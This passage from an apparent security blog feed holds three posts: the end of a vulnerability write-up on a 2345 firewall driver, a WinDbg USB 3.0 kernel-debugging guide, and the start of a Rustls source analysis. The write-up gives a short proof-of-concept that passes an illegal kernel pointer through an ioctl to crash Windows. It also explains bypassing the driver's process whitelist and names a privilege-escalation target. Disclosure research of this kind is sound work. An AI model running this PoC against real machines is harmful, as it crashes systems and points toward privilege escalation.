src="http://wx4.sinaimg.cn/mw690/006mu4nKly1ft1h1f0t5yj30jt05274h.jpg" alt="img"></p> <p>既然0不行，那么其他地址还是可以的嘛，比如某些内核地址0x80000000，或者nt!HalDispatchTable（某些提权方式使用的地址）。</p> <p>用下面的poc代码尝试了一下，bsod！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctlcode = 0x222014;</span><br><span class="line">NETFW_IOCTL_222014 buf_222014 = &#123;0&#125;;</span><br><span class="line">buf_222014.size = 1;</span><br><span class="line">buf_222014.ptr = (DWORD*)0x80000000; //非法内核地址</span><br><span class="line">if(!DeviceIoControl(h, ctlcode, &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;BytesReturned, NULL)) &#123;</span><br><span class="line"> printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kd&gt; dd 80000000</span><br><span class="line">80000000  ???????? ???????? ???????? ????????</span><br><span class="line">80000010  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure> <p>至此，该内核拒绝服务漏洞验证成功，替换未其他内核地址还是有希望提权的，这里不在深入研究。</p> <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>看完整篇，其实知道该漏洞真的很明显，很弱B是吧。但是基于某些原因（门槛？漏洞价值？），内核驱动这方面受到的关注较少，所以被虐的少了，开发人员重视程度也不够，所以对于参数的校验上就没那么认真严谨了！所以留下了这种弱X的洞洞被我捡漏。</p> <p>当然，前面提到2345在3.6版本中已经被人干过，所以还是做了一定的工作的，除了加入了异常保护代码，对于ioctl接口调用也加入了一定的限制和校验。所以poc不是直接就调用接口就成功触发bsod的，而做了一定的前期工作来应对2345做的限制和保护。</p> <p><strong>这里不是重点，大致讲一下。在IRP_MJ_DEVICE_CONTROL处理函数中，首先会校验调用接口的进程是否在缓存的白名单进程中，但是呢2345又提供了ioctl接口来添加进程到白名单中，对该接口也没做什么其他的校验，所以很随意的调用成功，把自己的poc进程加入了白名单中，然后再调用漏洞接口触发bsod，完成！</strong></p> <p>另外，如果有兴趣也研究一些驱动此类漏洞的，并且对驱动编程不是很了解的，建议可以先简单学习一下简单驱动编写模板、ring3和ring0通信方式、驱动设备等等内容，推荐可以看看《Windows驱动开发技术详解》相关章节内容。</p> <p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-1/">https://anhkgg.github.io/vul-2345-1/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;已经快2个月了吧，已经忘了是什么原因突然搞起了驱动漏洞，反正就是很有兴致地想挖掘一下驱动漏洞。&lt;/p&gt; &lt;p&gt;在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如&lt;a href=&quot;https://github.com/N3mes1s/ioctlbf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ioctlbf&lt;/a&gt;、&lt;a href=&quot;https://github.com/k0keoyo/kDriver-Fuzzer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;kDriver-Fuzzer&lt;/a&gt;等等。&lt;/p&gt; &lt;p&gt;kDriver-Fuzzer的作者k0keoyo在2017年收获了100多个CVE，很牛逼啊，这个已经2018年了，再来挖此种类型的驱动是不是已经晚了啊，心中苦涩啊。&lt;/p&gt; &lt;p&gt;不过毕竟也写了几年驱动程序了，不搞搞怎么也说不过去啊，所以开始干！&lt;/p&gt;          </summary>            <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>                 <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>            <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>            <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>        </entry>      <entry>     <title>Windbg USB3.0双机调试</title>     <link href="https://anhkgg.github.io/windbg-usb3-dbg-win10/"/>     <id>https://anhkgg.github.io/windbg-usb3-dbg-win10/</id>     <published>2018-03-23T06:31:36.000Z</published>     <updated>2018-03-23T06:55:19.751Z</updated>          <content type="html"><![CDATA[<h1 id="配置需求"><a href="#配置需求" class="headerlink" title="配置需求"></a>配置需求</h1><p>1.目标主机有USB3.0 xHCI主机控制器，支持调试<br>2.host主机支持USB3.0 xHCI主机控制器(使用UsbView查看)<br>3.USB 3.0 调试线(<a href="https://www.datapro.net/products/usb-3-0-super-speed-a-a-debugging-cable.html" target="_blank" rel="noopener">国外购买地址</a>（可以用普通USB3.0 公对公线改造，剪掉红绿百三根线）</p> <blockquote> <p>先从淘宝买一根USB 3的A对A连线，有时也称公对公连线，很便宜。这根线需要加工一下才可以支持调试，加工的方法是选取线的某个位置，剥开外皮，然后把其中的红绿白三根线剪断，然后包上就可以了。USB 3电缆的线是有固定颜色的，如图3所示，<br>其中SDP是Shielded Differential Pair的缩写，即屏蔽起来的差分信号线，是USB 3.0的数据线，UTP是Unshielded Twisted Pair的缩写，即未屏蔽的双绞线，是USB1/2使用的数据线，所谓的D+，D-。要做的加工其实就是把2.0的三根弦剪断。剥开后，很容易找到红绿白三根，胆大心细，下剪子吧:-)。</p> </blockquote> <p>4.两台主机系统必须是Win8以上</p> <blockquote> <p>On the host computer, an xHCI (USB 3.0) host controller<br>On the target computer, an xHCI (USB 3.0) host controller that supports debugging</p> </blockquote> <a id="more"></a> <h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p><strong>在目标主机配置调试模式。</strong></p> <p>命令：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings usb targetname:TargetName</span><br><span class="line">//如果目标主机有多个xHCI主机控制器，则需要配置需要使用的，b.d.f在usbview中可以看到</span><br><span class="line">bcdedit /set &quot;&#123;dbgsettings&#125;&quot; busparams b.d.f</span><br><span class="line">//重启主机</span><br></pre></td></tr></table></figure> <p>使用msconfig配置，引导，高级模式，勾选调试，选择USB模式，USB目标名：usbdbg</p> <p><strong>host主机配置。</strong></p> <p>第一次配置，如果host是X64，开启X64 windbg，如果是x86，选择开启x86 windbg，需要管理员权限运行。</p> <p>Ctrl+K，选择USB，填入目标主机配置的名字（usbdbg），确认，等待。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Microsoft (R) Windows Debugger Version 10.0.14321.1024 AMD64</span><br><span class="line">Copyright (c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Using USB for debugging</span><br><span class="line">Waiting to reconnect...</span><br><span class="line">USB: Write opened</span><br></pre></td></tr></table></figure> <p>当将USB调试线插入host主机接口时，会自动安装相关驱动（usb2dbg等，管理员，位数等要求的原因）。</p> <p>然后出现<code>USB: Write opened</code>表示与目标主机连接成功。</p> <p>按下Ctrl+break，即可开始调试目标主机了</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Connected to Windows 10 16299 x64 target at (Tue Dec 12 09:47:18.535 2017 (UTC + 8:00)), ptr64 TRUE</span><br><span class="line">Kernel Debugger connection established.</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       SRV*e:\symbols* http://msdl.microsoft.com/download/symbols</span><br><span class="line">Deferred                                       SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Symbol search path is: SRV*e:\symbols* http://msdl.microsoft.com/download/symbols;SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Executable search path is: </span><br><span class="line">Windows 10 Kernel Version 16299 MP (4 procs) Free x64</span><br><span class="line">Product: WinNt, suite: TerminalServer SingleUserTS</span><br><span class="line">Built by: 16299.15.amd64fre.rs3_release.170928-1534</span><br><span class="line">Machine Name:</span><br><span class="line">Kernel base = 0xfffff800`9e21d000 PsLoadedModuleList = 0xfffff800`9e57efb0</span><br><span class="line">Debug session time: Tue Dec 12 09:47:12.452 2017 (UTC + 8:00)</span><br><span class="line">System Uptime: 3 days 17:11:46.032</span><br><span class="line">WARNING: Whitespace at end of path element</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       SRV*e:\symbols* http://msdl.microsoft.com/download/symbols</span><br><span class="line">Deferred                                       SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*   You are seeing this message because you pressed either                    *</span><br><span class="line">*       CTRL+C (if you run console kernel debugger) or,                       *</span><br><span class="line">*       CTRL+BREAK (if you run GUI kernel debugger),                          *</span><br><span class="line">*   on your debugger machine&apos;s keyboard.                                      *</span><br><span class="line">*                                                                             *</span><br><span class="line">*                   THIS IS NOT A BUG OR A SYSTEM CRASH                       *</span><br><span class="line">*                                                                             *</span><br><span class="line">* If you did not intend to break into the debugger, press the &quot;g&quot; key, then   *</span><br><span class="line">* press the &quot;Enter&quot; key now.  This message might immediately reappear.  If it *</span><br><span class="line">* does, press &quot;g&quot; and &quot;Enter&quot; again.                                          *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff800`9e386c60 cc              int     3</span><br></pre></td></tr></table></figure> <p>连接成功，设备管理中出现<code>USB Debug Connection Device</code>。</p> <p>参考：</p> <ol> <li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-a-usb-3-0-debug-cable-connection" target="_blank" rel="noopener">setting-up-a-usb-3-0-debug-cable-connection</a></li> <li><a href="http://en.community.dell.com/techcenter/b/techcenter/archive/2014/09/30/usb3-kernel-debugging-with-dell-poweredge-13g-servers" target="_blank" rel="noopener">USB3 Kernel Debugging with Dell PowerEdge 13G Servers</a></li> <li><a href="http://blog.techlab-xe.net/archives/1961" target="_blank" rel="noopener">http://blog.techlab-xe.net/archives/1961</a></li> <li><a href="http://advdbg.org/blogs/advdbg_system/articles/5954.aspx" target="_blank" rel="noopener">使用USB3.0调试Windows 8</a></li> </ol> ]]></content>          <summary type="html">            &lt;h1 id=&quot;配置需求&quot;&gt;&lt;a href=&quot;#配置需求&quot; class=&quot;headerlink&quot; title=&quot;配置需求&quot;&gt;&lt;/a&gt;配置需求&lt;/h1&gt;&lt;p&gt;1.目标主机有USB3.0 xHCI主机控制器，支持调试&lt;br&gt;2.host主机支持USB3.0 xHCI主机控制器(使用UsbView查看)&lt;br&gt;3.USB 3.0 调试线(&lt;a href=&quot;https://www.datapro.net/products/usb-3-0-super-speed-a-a-debugging-cable.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;国外购买地址&lt;/a&gt;（可以用普通USB3.0 公对公线改造，剪掉红绿百三根线）&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;先从淘宝买一根USB 3的A对A连线，有时也称公对公连线，很便宜。这根线需要加工一下才可以支持调试，加工的方法是选取线的某个位置，剥开外皮，然后把其中的红绿白三根线剪断，然后包上就可以了。USB 3电缆的线是有固定颜色的，如图3所示，&lt;br&gt;其中SDP是Shielded Differential Pair的缩写，即屏蔽起来的差分信号线，是USB 3.0的数据线，UTP是Unshielded Twisted Pair的缩写，即未屏蔽的双绞线，是USB1/2使用的数据线，所谓的D+，D-。要做的加工其实就是把2.0的三根弦剪断。剥开后，很容易找到红绿白三根，胆大心细，下剪子吧:-)。&lt;/p&gt; &lt;/blockquote&gt; &lt;p&gt;4.两台主机系统必须是Win8以上&lt;/p&gt; &lt;blockquote&gt; &lt;p&gt;On the host computer, an xHCI (USB 3.0) host controller&lt;br&gt;On the target computer, an xHCI (USB 3.0) host controller that supports debugging&lt;/p&gt; &lt;/blockquote&gt;          </summary>            <category term="debug" scheme="https://anhkgg.github.io/categories/debug/"/>                 <category term="windbg" scheme="https://anhkgg.github.io/tags/windbg/"/>            <category term="usb3" scheme="https://anhkgg.github.io/tags/usb3/"/>            <category term="debug" scheme="https://anhkgg.github.io/tags/debug/"/>            <category term="win10" scheme="https://anhkgg.github.io/tags/win10/"/>        </entry>      <entry>     <title>Rustls之源码分析总结（一）</title>     <link href="https://anhkgg.github.io/rustls-source-code-analyze/"/>     <id>https://anhkgg.github.io/rustls-source-code-analyze/</id>     <published>2017-11-17T05:19:50.000Z</published>     <updated>2017-11-17T05:35:17.810Z</updated>          <content type="html"><![CDATA[<ul> <li>作者：<strong>anhkgg</strong> </li> <li>日期：<strong>2017-11-16</strong></li> </ul> <p>rustls已经支持tls1.3，但是测试分析中使用的tls1.2，所以后面分析主要集中在tls1.2。</p> <p>主要分析的源码内容：</p> <ol> <li>client和server的握手协议流程</li> <li>rustls是如何进行数据传输的</li> <li>数据传输是如何加密解密的</li> </ol> <a id="more"></a> <h2 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h2><p><strong>分为client和server两部分</strong></p> <h3 id="公共接口"><a href="#公共接口" class="headerlink" title="公共接口"></a>公共接口</h3><p><strong>session.rs</strong>定义了SessionCommon，包括了数据传输、数据加密、包处理相关接口。</p> <p><strong>主要字段</strong></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pub struct SessionCommon &#123;</span><br><span class="line">    pub negotiated_version: Option&lt;ProtocolVersion&gt;, //协商好的协议版本</span><br><span class="line">    pub is_client: bool, //是客户端true，是服务端false</span><br><span class="line">    message_encrypter: Box&lt;MessageEncrypter&gt;, //数据加密接口</span><br><span class="line">    message_decrypter: Box&lt;MessageDecrypter&gt;, //数据解密接口</span><br><span class="line">    key_schedule: Option&lt;KeySchedule&gt;,</span><br><span class="line">    suite: Option&lt;&amp;&apos;static SupportedCipherSuite&gt;,</span><br><span class="line">    write_seq: u64,</span><br><span class="line">    read_seq: u64,</span><br><span class="line">    peer_eof: bool,</span><br><span class="line">    pub peer_encrypting: bool,</span><br><span class="line">    pub we_encrypting: bool,</span><br><span class="line">    pub traffic: bool, // 默认false，握手完成字段为true</span><br><span class="line">    pub want_write_key_update: bool,</span><br><span class="line">    pub message_deframer: MessageDeframer, //消息帧处理对象，保存所有Message包</span><br><span class="line">    pub handshake_joiner: HandshakeJoiner,</span><br><span class="line">    pub message_fragmenter: MessageFragmenter,</span><br><span class="line">    received_plaintext: ChunkVecBuffer, //缓存接收到的数据明文</span><br><span class="line">    sendable_plaintext: ChunkVecBuffer,//缓存握手后需要传输的数据明文</span><br><span class="line">    pub sendable_tls: ChunkVecBuffer, //缓存握手数据包</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>主要接口</strong></p> <table> <thead> <tr> <th>函数名</th> <th>说明 </th> </tr> </thead> <tbody> <tr> <td><code>read_tls</code></td> <td>接收底层连接数据 </td> </tr> <tr> <td><code>write_tls</code></td> <td>通过底层连接发送数据</td> </tr> <tr> <td><code>process_new_packets</code></td> <td>每次调用read_tls之后都需要调用该函数主动触发消息处理</td> </tr> <tr> <td><code>wants_read/wants_write</code></td> <td>是否有数据需要接收发送</td> </tr> <tr> <td><code>encrypt_outgoing</code></td> <td>加密要发送的数据，在握手完成之后需要</td> </tr> <tr> <td><code>decrypt_incoming</code></td> <td>解密要接收的数据，在握手完成之后需要</td> </tr> <tr> <td><code>send_msg_encrypt</code></td> <td>发送加密数据</td> </tr> <tr> <td><code>send_appdata_encrypt</code></td> <td>发送握手之后的数据，加密</td> </tr> <tr> <td><code>send_some_plaintext</code></td> <td>发送明文数据，握手之后会被加密发送</td> </tr> <tr> <td><code>start_traffic</code></td> <td>握手完成之后调用，设置传输标志，发送缓存的数据明文</td> </tr> <tr> <td><code>send_msg</code></td> <td>发送TLS消息，根据是否加密走不通发送方式</td> </tr> <tr> <td><code>take_received_plaintext</code></td> <td>握手完成之后，收到数据会被调用，参数已经是明文Message</td> </tr> <tr> <td><code>set_message_encrypter</code></td> <td>设置消息加密接口，<code>start_encryption_tls12</code>中调用</td> </tr> <tr> <td><code>set_message_decrypter</code></td> <td>设置消息解密接口，<code>start_encryption_tls12</code>中调用</td> </tr> <tr> <td><code>start_encryption_tls12</code></td> <td>TLS1.2设置加解密接口，在ExpectTLS12ServerDone::handle/ExpectTLS12ClientKX::handle调用</td> </tr> </tbody> </table> <p><strong>ciper.rs</strong>定义了加密解密的接口。</p> <p><code>MessageEncrypter</code>,<code>MessageDecrypter</code>，具体使用加解密方法在握手过程中ExpectTLS12ServerDone::handle/ExpectTLS12ClientKX::handle设置。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//client端</span><br><span class="line">// 5e. Now commit secrets.</span><br><span class="line">let hashalg = sess.common.get_suite().get_hash();</span><br><span class="line">if st.handshake.using_ems &#123;</span><br><span class="line">    sess.secrets = Some(SessionSecrets::new_ems(&amp;st.handshake.randoms,</span><br><span class="line">                                                &amp;handshake_hash,</span><br><span class="line">                                                hashalg,</span><br><span class="line">                                                &amp;kxd.premaster_secret));</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    sess.secrets = Some(SessionSecrets::new(&amp;st.handshake.randoms,</span><br><span class="line">                                            hashalg,</span><br><span class="line">                                            &amp;kxd.premaster_secret));</span><br><span class="line">&#125;</span><br><span class="line">sess.start_encryption_tls12();</span><br><span class="line">//----------</span><br><span class="line">pub fn start_encryption_tls12(&amp;mut self, secrets: &amp;SessionSecrets) &#123;</span><br><span class="line">        let (dec, enc) = cipher::new_tls12(self.get_suite(), secrets);</span><br><span class="line">        self.message_encrypter = enc;</span><br><span class="line">        self.message_decrypter = dec;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> <h3 id="client详解"><a href="#client详解" class="headerlink" title="client详解"></a>client详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src/client/mod.rs 导出ClientSession接口，外部使用</span><br><span class="line">src/client/hs.rs tls协议中所有包处理，包括握手和传输</span><br></pre></td></tr></table></figure> <p><code>ClientSession</code>内部由<code>ClientSessionImpl</code>实现。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pub struct ClientSessionImpl &#123;</span><br><span class="line">    pub config: Arc&lt;ClientConfig&gt;, //保存client端的证书，密钥配置等信息</span><br><span class="line">    pub secrets: Option&lt;SessionSecrets&gt;, //保存握手后的会话密钥</span><br><span class="line">    pub alpn_protocol: Option&lt;String&gt;,</span><br><span class="line">    pub common: SessionCommon, // 完成具体消息传输、加解密等</span><br><span class="line">    pub error: Option&lt;TLSError&gt;,</span><br><span class="line">    pub state: Option&lt;Box&lt;hs::State + Send&gt;&gt;, // 保存握手过程中的交互状态，握手中处理对象都实现State接口</span><br><span class="line">    pub server_cert_chain: CertificatePayload, // 服务端证书链</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>握手，准备第一个数据包</strong>。</p> <p><code>ClientSessionImpl::new</code>内部就会准备握手要发送的第一个数据包。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cs.state = Some(hs::start_handshake(&amp;mut cs, hostname));</span><br><span class="line">//cs.state保存下一次将处理数据对象</span><br><span class="line">---&gt; //进入hs.rs</span><br><span class="line">InitialState::emit_initial_client_hello</span><br><span class="line">---&gt;</span><br><span class="line">emit_client_hello_for_retry</span><br><span class="line">---&gt; //构造发送的数据包</span><br><span class="line">let mut chp = HandshakeMessagePayload &#123;</span><br><span class="line">        typ: HandshakeType::ClientHello,</span><br><span class="line">        payload: HandshakePayload::ClientHello(ClientHelloPayload &#123;</span><br><span class="line">            client_version: ProtocolVersion::TLSv1_2,</span><br><span class="line">            random: Random::from_slice(&amp;handshake.randoms.client),</span><br><span class="line">            session_id: session_id,</span><br><span class="line">            cipher_suites: sess.get_cipher_suites(),</span><br><span class="line">            compression_methods: vec![Compression::Null],</span><br><span class="line">            extensions: exts,</span><br><span class="line">        &#125;),</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure> <p>然后，收到返回数据之后，会在<code>ClientSessionImpl::process_main_protocol</code>调用<code>state.handle</code>来处理收到的数据，然后返回新的state，用于下次处理，如此循环，知道握手完成。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn process_main_protocol(&amp;mut self, msg: Message) -&gt; Result&lt;(), TLSError&gt; &#123;</span><br><span class="line"> //检查消息是否合法</span><br><span class="line">    let state = self.state.take().unwrap();</span><br><span class="line">    state</span><br><span class="line">        .check_message(&amp;msg)</span><br><span class="line">        .map_err(|err| &#123;</span><br><span class="line">            self.queue_unexpected_alert();</span><br><span class="line">            err</span><br><span class="line">        &#125;)?;</span><br><span class="line">    //处理本次数据，返回下次需要处理的数据对象</span><br><span class="line">    self.state = Some(state.handle(self, msg)?);</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>消息处理调用流程如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//ClientSessionImpl</span><br><span class="line">process_new_packets-&gt;process_msg-&gt;process_main_protocol-&gt;state.handle</span><br></pre></td></tr></table></figure> <p>下面直接列出client端握手处理流程：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ExpectServerHelloOrHelloRetryRequest:handle </span><br><span class="line">ExpectServerHello:handle // 处理serverhello</span><br><span class="line">ExpectTLS12Certificate: handle //验证证书</span><br><span class="line">ExpectTLS12ServerKX: handle  // 密钥交换</span><br><span class="line">ExpectTLS12ServerDoneOrCertReq: handle</span><br><span class="line">ExpectTLS12ServerDone: handle</span><br><span class="line">emit_clientkx</span><br><span class="line">emit_ccs</span><br><span class="line">ExpectTLS12CCS:handle //通知使用加密方式发送报文，sess.common.peer_now_encrypting();设置后面数据会加密的状态</span><br><span class="line">emit_finished</span><br><span class="line">ExpectTLS12Finished:handle // 握手结束</span><br></pre></td></tr></table></figure> <p>在<code>ExpectTLS12Finished::handle</code>中，会保存<code>session</code>，开始传输数据，以及返回下次的<code>state</code>，<strong>此时握手协议已经完成</strong>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">save_session(&amp;mut st.handshake,</span><br><span class="line">             &amp;mut st.ticket,</span><br><span class="line">             sess);</span><br><span class="line"></span><br><span class="line">if st.resuming &#123;</span><br><span class="line">    emit_ccs(sess);</span><br><span class="line">    emit_finished(&amp;mut st.handshake, sess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sess.common.we_now_encrypting();</span><br><span class="line">sess.common.start_traffic(); //发送数据</span><br><span class="line">Ok(st.into_expect_tls12_traffic(fin)) // 下次需要ExpectTLS12Traffic</span><br></pre></td></tr></table></figure> <p>后面数据传输的所有流程都会进入<code>ExpectTLS12Traffic::handle</code>，也就是开始<strong>传输协议</strong>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">impl State for ExpectTLS12Traffic &#123;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ClientSessionImpl, mut m: Message) -&gt; StateResult &#123;</span><br><span class="line">   sess.common.take_received_plaintext(m.take_opaque_payload().unwrap());</span><br><span class="line">        Ok(self) //返回的依然是ExpectTLS12Traffic给state，所以以后都会进入这里</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>传输数据的处理</strong>。</p> <p><strong>接收数据</strong></p> <p>调用<code>take_received_plaintext</code>将获取到的明文Message传给内部处理，存入<code>SessionCommon</code>的<code>received_plaintext</code>，等待用户的提取。</p> <p>那明文Message是怎么来的呢？是在前面说到的消息处理流程中，到handle之前。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process_new_packets-&gt;process_msg-&gt;process_main_protocol-&gt;state.handle</span><br></pre></td></tr></table></figure> <p>在<code>process_msg</code>中会判断<code>peer_encrypting</code>状态为真则将数据解密，而该状态是在握手中<code>ExpectTLS12CCS::handle</code> 被设置为true的。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pub fn process_msg(&amp;mut self, mut msg: Message) -&gt; Result&lt;(), TLSError&gt; &#123;</span><br><span class="line"> // Decrypt if demanded by current state.</span><br><span class="line"> if self.common.peer_encrypting &#123;</span><br><span class="line">     let dm = self.common.decrypt_incoming(msg)?; //解密数据</span><br><span class="line">     msg = dm;</span><br><span class="line"> &#125;</span><br><span class="line">        </span><br><span class="line">//self.common.peer_encrypting</span><br><span class="line">pub fn peer_now_encrypting(&amp;mut self) &#123;</span><br><span class="line">    self.peer_encrypting = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p><strong>发送数据</strong></p> <p><strong>握手过程中</strong>，发送数据包使用<code>sess.common.send_msg(ch, false)</code>。<code>send_msg</code>内部根据是否加密状态（<code>must_encrypt</code>）进行不同处理，直接缓存或者调用<code>send_msg_encrypt</code>加密之后缓存。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span 